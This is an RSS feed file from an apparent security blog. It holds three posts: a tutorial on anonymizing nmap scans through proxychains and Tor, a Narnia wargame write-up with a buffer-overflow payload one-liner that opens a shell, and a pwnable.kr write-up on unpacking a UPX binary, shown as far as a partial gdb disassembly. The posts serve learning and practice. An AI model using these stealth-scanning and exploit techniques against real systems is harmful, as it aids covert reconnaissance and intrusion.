@@ -1,0 +1,1433 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Bugtree</title>
+		<description>The Docs. Read them.</description>
+		<link>/</link>
+		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
+		
+			<item>
+				<title>Nmap Anonymization with Proxychains</title>
+				<description>&lt;p&gt;If you work in the infosec industry and never asked yourself this question, please take your time to think. Our objective here is to accomplish a full scan without revealing our real IP to the target.&lt;/p&gt;
+
+&lt;h1 id=&quot;anonymizing-an-nmap-scan&quot;&gt;Anonymizing an nmap scan&lt;/h1&gt;
+
+&lt;p&gt;There are multiple ways to accomplish this noble mission. One way would be to execute an &lt;a href=&quot;https://nmap.org/book/idlescan.html&quot;&gt;Idle Scan&lt;/a&gt;, aka &lt;a href=&quot;https://nmap.org/book/idlescan.html#idm140153167240176&quot;&gt;“the ultimate stealth scan”&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Another idea is just to use proxies or even TOR. Although nmap offers a &lt;code class=&quot;highlighter-rouge&quot;&gt;--proxy&lt;/code&gt; option, &lt;a href=&quot;https://nmap.org/book/man-bypass-firewalls-ids.html&quot;&gt;it should be noted that&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: this feature is still under development and has limitations. It is implemented within the nsock library and thus has no effect on the ping, port scanning and OS discovery phases of a scan. Only NSE and version scan benefit from this option so far—other features may disclose your true address. SSL connections are not yet supported, nor is proxy-side DNS resolution (hostnames are always resolved by Nmap).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, it does not give us much of an option instead of not trusting this feature, does it? Then we present you another solution: proxychains.&lt;/p&gt;
+
+&lt;h1 id=&quot;what-does-proxychains-do-and-does-not&quot;&gt;What does proxychains do (and does not)?&lt;/h1&gt;
+
+&lt;p&gt;According to the &lt;a href=&quot;https://packages.debian.org/stretch/proxychains&quot;&gt;package description&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxy chains - redirect connections through proxy servers
+
+Proxy chains force any tcp connection made by any given tcp client to follow through proxy (or proxy chain). It is a kind of proxifier. It acts like sockscap / premeo / eborder driver ( intercepts TCP calls ) 
+
+This version supports SOCKS4, SOCKS5 and HTTP CONNECT proxy servers. Different proxy types can be mixed in the same chain. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another thing to note in &lt;a href=&quot;http://proxychains.sourceforge.net/&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Proxychains] Allows TCP and DNS tunneling through proxies. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These are the two protocols we are going to “secure” while using proxychains. Keep in mind that all other protocols might pose a hazard to your anonimity.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Please do check your proxychains version before using it&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The latest version of this tool according to the &lt;a href=&quot;http://proxychains.sourceforge.net/&quot;&gt;SourceForge page&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ProxyChains README 
+current version: 3.1
+======================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, there is a &lt;a href=&quot;https://github.com/haad/proxychains&quot;&gt;very well starred repo in GitHub&lt;/a&gt; that declares:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ProxyChains ver. 4.2.0 README
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, according to &lt;a href=&quot;https://man.cx/proxychains&quot;&gt;proxychain’s man page in Debian 9&lt;/a&gt; (and Kali therefore):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This version (2.0) supports SOCKS4, SOCKS5 and HTTP CONNECT proxy servers.  Auth-types: socks - &quot;user/pass&quot; , http - &quot;basic&quot;.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;WTF Debian?! To be sure this is just an outdated manpage I checked the package informations:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt show proxychains
+Package: proxychains
+Version: 3.1-7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So yeah, it seems ok. The main difference between versions 2 and 3 is the support for DNS requests (which is something really important). Anyway, you should check your version and run some local tests just in case.&lt;/p&gt;
+
+&lt;h1 id=&quot;nmap-scan-phases&quot;&gt;nmap scan phases&lt;/h1&gt;
+
+&lt;p&gt;I am assuming here you are familiarized with it. If not, refer to &lt;a href=&quot;https://nmap.org/book/nmap-phases.html&quot;&gt;this page&lt;/a&gt;. All an all, the phases are:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Script pre-scanning&lt;/li&gt;
+  &lt;li&gt;Target enumeration&lt;/li&gt;
+  &lt;li&gt;Host discovery (ping scanning)&lt;/li&gt;
+  &lt;li&gt;Reverse-DNS resolution&lt;/li&gt;
+  &lt;li&gt;Port scanning&lt;/li&gt;
+  &lt;li&gt;Version detection&lt;/li&gt;
+  &lt;li&gt;OS detection&lt;/li&gt;
+  &lt;li&gt;Traceroute&lt;/li&gt;
+  &lt;li&gt;Script scanning&lt;/li&gt;
+  &lt;li&gt;Output&lt;/li&gt;
+  &lt;li&gt;Script post-scanning&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;what-is-a-ping-to-nmap&quot;&gt;What is a ping to nmap?&lt;/h1&gt;
+
+&lt;p&gt;First point to make clear is the concept of &lt;em&gt;ping&lt;/em&gt; in nmap’s terminology:&lt;/p&gt;
+
+&lt;p&gt;So let it be clear once and for all:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ping in daily network lingo is a *program* that uses ICMP to &quot;send ICMP ECHO_REQUEST to network hosts&quot;. 
+Ping in nmap lingo is any request done in the host discovery phase (**not necessarily ICMP**).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ping scan therefore uses multiple protocols besides ICMP. Keep that in mind.
+Now we know the difference between these two guys, we may move on.&lt;/p&gt;
+
+&lt;h1 id=&quot;proxychains&quot;&gt;Proxychains&lt;/h1&gt;
+
+&lt;p&gt;Our proxychains config is set to use SOCKS5 protocol in order to tunnel our requests through the TOR network. Our TOR client is listening in port 9050 for that matter. This is the default configuration for proxychains, so lets keep it this way.&lt;/p&gt;
+
+&lt;h1 id=&quot;leaks-in-host-discovery&quot;&gt;Leaks in Host Discovery&lt;/h1&gt;
+
+&lt;p&gt;Since we can only use TCP and DNS withing Proxychains, we must disable all other protocols used in Host Discovery phase. According to the Nmap Network Scanning Guide:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note that if you specify any of the -P options discussed in this section, they *replace* the default discovery probes rather than adding to them.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So if we want to skip any UDP or ICMP packets in host discovery and stick only to TCP probes, it should be enough to add the -PT option. This should orverrule all the other ping types.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxychains nmap -PT 216.58.222.14 -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-17 10:50 -02
+Initiating Ping Scan at 10:50
+Scanning 216.58.222.14 [1 port]
+Completed Ping Scan at 10:50, 2.04s elapsed (1 total hosts)
+Nmap scan report for 216.58.222.14 [host down, received no-response]
+Read data files from: /usr/bin/../share/nmap
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 2.12 seconds
+           Raw packets sent: 2 (80B) | Rcvd: 0 (0B)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But no luck this time! In fact, we can check our host is probing the target directly:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo tcpdump host 216.58.214.228
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on wlp2s0, link-type EN10MB (Ethernet), capture size 262144 bytes
+21:18:02.660856 IP fahrzeug.40730 &amp;gt; bud02s24-in-f228.1e100.net.http: Flags [.], ack 4253451774, win 1024, length 0
+21:18:03.661962 IP fahrzeug.40731 &amp;gt; bud02s24-in-f228.1e100.net.http: Flags [.], ack 4253517311, win 1024, length 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Two SYN pings from our host to the target, no proxy. Bad bad OPSEC, folks.&lt;/p&gt;
+
+&lt;p&gt;Since proxychains is not tunneling our ping scan, even when we use SYN scan only, how can we avoid leaking our IP during the host discovery phase? Simple: skip it! Make sure the target host is up using some other method and then go for the scanning phase.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# proxychains nmap -Pn -p80 -sT 216.58.222.14 -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-17 13:05 -02
+Initiating Parallel DNS resolution of 1 host. at 13:05
+Completed Parallel DNS resolution of 1 host. at 13:05, 0.10s elapsed
+Initiating Connect Scan at 13:05
+Scanning gru06s25-in-f14.1e100.net (216.58.222.14) [1 port]
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-216.58.222.14:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Discovered open port 80/tcp on 216.58.222.14
+Completed Connect Scan at 13:05, 0.69s elapsed (1 total ports)
+Nmap scan report for gru06s25-in-f14.1e100.net (216.58.222.14)
+Host is up, received user-set (0.69s latency).
+Scanned at 2017-10-17 13:05:18 -02 for 0s
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now our tcpdump result is clean:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump host 216.58.222.14
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on wlp2s0, link-type EN10MB (Ethernet), capture size 262144 bytes
+
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In conclusion, it is not safe to go through the host discovery phase when using proxychains.&lt;/p&gt;
+
+&lt;h1 id=&quot;leaks-in-dns-resolution&quot;&gt;Leaks in DNS resolution&lt;/h1&gt;
+
+&lt;p&gt;This time we are concerned with leaking our IP address through DNS requests. Let’s begin with a simple TCP scan:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# proxychains nmap -Pn -sT -p80 www.google.com -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-17 12:36 -02
+|DNS-request| www.google.com
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-4.2.2.2:53-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|DNS-response| www.google.com is 74.125.29.104
+74.125.29.104/0 looks like an IPv6 target specification -- you have to use the -6 option.
+Read data files from: /usr/bin/../share/nmap
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 1.18 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The DNS request was correctly made through proxychains, which is using TOR. Strangely, nmap interprets 216.58.214.228/0 as an IPv6 address and then breaks. It seems nmap does not get along with our SOCKS5 DNS resolution.&lt;/p&gt;
+
+&lt;p&gt;Let’s see what happens if we scan the IP address directly, instead of the name:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# proxychains nmap -Pn -sT -p80 216.58.222.14 --packet-trace -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+                                             
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-17 12:52 -02
+NSOCK INFO [0.0310s] nsock_iod_new2(): nsock_iod_new (IOD #1)
+NSOCK INFO [0.0310s] nsock_connect_udp(): UDP connection requested to 8.8.8.8:53 (IOD #1) EID 8
+NSOCK INFO [0.0310s] nsock_read(): Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 18
+NSOCK INFO [0.0310s] nsock_iod_new2(): nsock_iod_new (IOD #2)
+NSOCK INFO [0.0310s] nsock_connect_udp(): UDP connection requested to 8.8.4.4:53 (IOD #2) EID 24
+NSOCK INFO [0.0310s] nsock_read(): Read request from IOD #2 [8.8.4.4:53] (timeout: -1ms) EID 34
+NSOCK INFO [0.0310s] nsock_iod_new2(): nsock_iod_new (IOD #3)
+NSOCK INFO [0.0310s] nsock_connect_udp(): UDP connection requested to 172.16.100.1:53 (IOD #3) EID 40
+NSOCK INFO [0.0310s] nsock_read(): Read request from IOD #3 [172.16.100.1:53] (timeout: -1ms) EID 50
+Initiating Parallel DNS resolution of 1 host. at 12:52
+NSOCK INFO [0.0310s] nsock_write(): Write request for 44 bytes to IOD #1 EID 59 [8.8.8.8:53]
+NSOCK INFO [0.0310s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [8.8.8.8:53]
+NSOCK INFO [0.0310s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 59 [8.8.8.8:53]
+NSOCK INFO [0.0310s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [8.8.4.4:53]
+NSOCK INFO [0.0310s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 40 [172.16.100.1:53]
+NSOCK INFO [0.2920s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [8.8.8.8:53] (125 bytes)
+NSOCK INFO [0.2920s] nsock_read(): Read request from IOD #1 [8.8.8.8:53] (timeout: -1ms) EID 66
+NSOCK INFO [0.2920s] nsock_iod_delete(): nsock_iod_delete (IOD #1)
+NSOCK INFO [0.2920s] nevent_delete(): nevent_delete on event #66 (type READ)
+NSOCK INFO [0.2920s] nsock_iod_delete(): nsock_iod_delete (IOD #2)
+NSOCK INFO [0.2920s] nevent_delete(): nevent_delete on event #34 (type READ)
+NSOCK INFO [0.2920s] nsock_iod_delete(): nsock_iod_delete (IOD #3)
+NSOCK INFO [0.2920s] nevent_delete(): nevent_delete on event #50 (type READ)
+Completed Parallel DNS resolution of 1 host. at 12:52, 0.26s elapsed
+Initiating Connect Scan at 12:52
+Scanning gru06s25-in-f14.1e100.net (216.58.222.14) [1 port]
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-216.58.222.14:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+CONN (0.9788s) TCP localhost &amp;gt; 216.58.222.14:80 =&amp;gt; Connected
+Discovered open port 80/tcp on 216.58.222.14
+Completed Connect Scan at 12:52, 0.69s elapsed (1 total ports)
+Nmap scan report for gru06s25-in-f14.1e100.net (216.58.222.14)
+Host is up, received user-set (0.69s latency).
+Scanned at 2017-10-17 12:52:19 -02 for 1s
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+                                                           
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, a reverse DNS resolution to Google’s DNS server (8.8.8.8) is done without a tunnel. Although we are not leaking our IP directly to the target, it still is being leaked. Confirming with tcpdump:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -vvv host 8.8.8.8 and udp                                                                                                                           
+tcpdump: listening on wlp2s0, link-type EN10MB (Ethernet), capture size 262144 bytes
+12:52:19.621972 IP (tos 0x0, ttl 64, id 10688, offset 0, flags [DF], proto UDP (17), length 72)
+    fahrzeug.57577 &amp;gt; google-public-dns-a.google.com.domain: [udp sum ok] 32419+ PTR? 14.222.58.216.in-addr.arpa. (44)
+12:52:19.882782 IP (tos 0x0, ttl 55, id 31896, offset 0, flags [none], proto UDP (17), length 153)
+    google-public-dns-a.google.com.domain &amp;gt; fahrzeug.57577: [udp sum ok] 32419 q: PTR? 14.222.58.216.in-addr.arpa. 4/0/0 14.222.58.216.in-addr.arpa. [23h47m25s] PTR gru06s25-in-f14.1e100.net., 14.222.58.216.in-addr.arpa. [23h47m25s] PTR gru06s25-in-f14.1e100.net., 14.222.58.216.in-addr.arpa. [23h47m25s] PTR gru06s25-in-f14.1e100.net., 14.222.58.216.in-addr.arpa. [23h47m25s] PTR gru06s25-in-f14.1e100.net. (125)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Due to this situation, it seems wise to use the &lt;strong&gt;-n&lt;/strong&gt; option (skip name resolution) when scanning through a proxy.&lt;/p&gt;
+
+&lt;h1 id=&quot;what-about-other-scan-types&quot;&gt;What about other scan types?&lt;/h1&gt;
+
+&lt;p&gt;We have been using so far the infamous -sT (SYN scan). What about -sS?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# proxychains nmap -Pn -n -sS -p80 216.58.222.14 --packet-trace -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-17 12:59 -02
+Initiating SYN Stealth Scan at 12:59
+Scanning 216.58.222.14 [1 port]
+SENT (0.0730s) TCP 172.16.100.250:43067 &amp;gt; 216.58.222.14:80 S ttl=59 id=23061 iplen=44  seq=774587308 win=1024 &amp;lt;mss 1460&amp;gt;
+RCVD (0.1134s) TCP 216.58.222.14:80 &amp;gt; 172.16.100.250:43067 SA ttl=55 id=63050 iplen=44  seq=2278336372 win=42780 &amp;lt;mss 1380&amp;gt;
+Discovered open port 80/tcp on 216.58.222.14
+Completed SYN Stealth Scan at 12:59, 0.22s elapsed (1 total ports)
+Nmap scan report for 216.58.222.14
+Host is up, received user-set (0.040s latency).
+Scanned at 2017-10-17 12:59:19 -02 for 0s
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 55
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
+           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And in tcpdump:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -vvv host 216.58.222.14
+tcpdump: listening on wlp2s0, link-type EN10MB (Ethernet), capture size 262144 bytes
+12:59:19.705036 IP (tos 0x0, ttl 59, id 23061, offset 0, flags [none], proto TCP (6), length 44)
+    fahrzeug.43067 &amp;gt; gru06s25-in-f14.1e100.net.http: Flags [S], cksum 0xb26f (correct), seq 774587308, win 1024, options [mss 1460], length 0
+12:59:19.745452 IP (tos 0x0, ttl 55, id 63050, offset 0, flags [none], proto TCP (6), length 44)
+    gru06s25-in-f14.1e100.net.http &amp;gt; fahrzeug.43067: Flags [S.], cksum 0xe050 (correct), seq 2278336372, ack 774587309, win 42780, options [mss 1380], length 0
+12:59:19.745507 IP (tos 0x0, ttl 64, id 3672, offset 0, flags [DF], proto TCP (6), length 40)
+    fahrzeug.43067 &amp;gt; gru06s25-in-f14.1e100.net.http: Flags [R], cksum 0xce28 (correct), seq 774587309, win 0, length 0
+
+3 packets captured
+3 packets received by filter
+0 packets dropped by kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From what we conclude the safest option from what we have tested so far is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ proxychains nmap -Pn -n -sT &amp;lt;target IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That is all for now, folks! Please note this is a first draft and &lt;del&gt;most certainly&lt;/del&gt; might contain &lt;del&gt;multiple&lt;/del&gt; some mistakes. Please feel free to share your corrections, suggestions and observations.&lt;/p&gt;
+</description>
+				<pubDate>Tue, 17 Oct 2017 00:00:00 -0200</pubDate>
+				<link>/pentest/2017/10/17/nmap-anon.html</link>
+				<guid isPermaLink="true">/pentest/2017/10/17/nmap-anon.html</guid>
+			</item>
+		
+			<item>
+				<title>Narnia 01 (VulnHub)</title>
+				<description>&lt;p&gt;I tried this one without reading the C code at first, although it should be allowed in the game. This is mainly because I felt like learning assembly the hard way. Also, source codes are not always available in the real world :).&lt;/p&gt;
+
+&lt;p&gt;First things first, black box testing. Just send a bunch o A’s. Actually, since 0x41 is A and the buffer is already filled with 0x41, we will send heretic B’s for this evil purpose. From the result we can see the buffer gives us its size. After 24 B’s, the rest is ignored.&lt;/p&gt;
+
+&lt;p&gt;Cool, so a 24 bytes buffer. All we got to do is appending 0xdeadbeef to our B’s string. Oh, just remember about x86 being little endian, will you? First problem appears when we realize we must send something in ASCII that will later be converted into hex by the program. So if we literally send 0xdeadbeef, it is going to consider our payload (after B’s) as 0, x, d and a in hex. Not what we want.&lt;/p&gt;
+
+&lt;p&gt;Fire up our python interpreter. Just print “\xef\xbe\xad\xde” and see the desired chars to be converted by the program. Instead of inserting them directly, which might not be accepted due to Terminal’s default encoding, let us pipe it with python.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'print &quot;A&quot;\*20 + &quot;\xef\xbe\xad\xde&quot;' | ./narnia0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No errors this time. Also, no shell this time. In fact, there was a shell, but it was closed even before anything could be executed. To keep the shell open, we must use the magical cat - trick. According to man cat:&lt;/p&gt;
+
+&lt;p&gt;With no FILE, or when FILE is -, read standard input.&lt;/p&gt;
+
+&lt;p&gt;So cat - reads stdin, which in our case is the program output, printing it gracefully for our pleasure. Just a final trick, in order to pipe multiple commands stdouts, just put them together inside parenthesis.&lt;/p&gt;
+
+&lt;p&gt;Final command is:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$ (python -c ‘print “A”*20 + “\xef\xbe\xad\xde”’; cat -)&lt;/td&gt;
+      &lt;td&gt;./narnia0&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;I expect to analyse the assembly code line by line soon.&lt;/p&gt;
+</description>
+				<pubDate>Wed, 29 Mar 2017 00:00:00 -0300</pubDate>
+				<link>/ctf/2017/03/29/narnia01.html</link>
+				<guid isPermaLink="true">/ctf/2017/03/29/narnia01.html</guid>
+			</item>
+		
+			<item>
+				<title>Pwnable.kr - flag [4]</title>
+				<description>&lt;p&gt;Pwnable.kr is not exactly easy even when they say it is. Despite this scary introduction, this specifically challenge is not that hard.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Papa brought me a packed present! let's open it.
+
+Download : http://pwnable.kr/bin/flag
+
+This is reversing task. all you need is binary
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Please note the first sentence of the text: “Papa brought me a &lt;strong&gt;packed&lt;/strong&gt; present!”. Here lies the key to solve it.
+After downloading the binary, let’s do a sanity check:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ file flag
+flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since the file is a stripped ELF, there is no use in running gdb in order to disassemble &lt;em&gt;main()&lt;/em&gt; or anything like that. After all, our symbol table is far gone.&lt;/p&gt;
+
+&lt;p&gt;One hint was given in the statement of the chall. &lt;em&gt;Packing&lt;/em&gt;. Packing is used, among other things, to obfuscate a binary. It basically compresses the binary and adds a decompression routine, so you get your full binary in memory only when you run it. Let’s search for compression signs:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ strings flag | grep pack
+$Info: This file is packed with the UPX executable packer http://upx.sf.net $
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I think this answers our question :) &lt;em&gt;UPX&lt;/em&gt; is one of the most commonly used packer for executables. in order to unpack it I had to first get UPX:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ wget -q https://github.com/upx/upx/releases/download/v3.92/upx-3.92-amd64_linux.tar.xz
+$ unxz -d upx-3.92-amd64_linux.tar.xz
+$ tar -xvf upx-3.92-amd64_linux.tar
+$ cd upx-3.92-amd64_linux.tar
+$ ./upx -d /PATH_TO/flag
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2016
+UPX 3.92        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Dec 11th 2016
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    887219 &amp;lt;-    313220   35.30%   linux/amd64   flag
+
+Unpacked 1 file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file flag 
+flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Not stripped! Fire up your gdb :D&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb -q ./flag
+gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x0000000000401164 &amp;lt;+0&amp;gt;: push   rbp
+   0x0000000000401165 &amp;lt;+1&amp;gt;: mov    rbp,rsp
+   0x0000000000401168 &amp;lt;+4&amp;gt;: sub    rsp,0x10
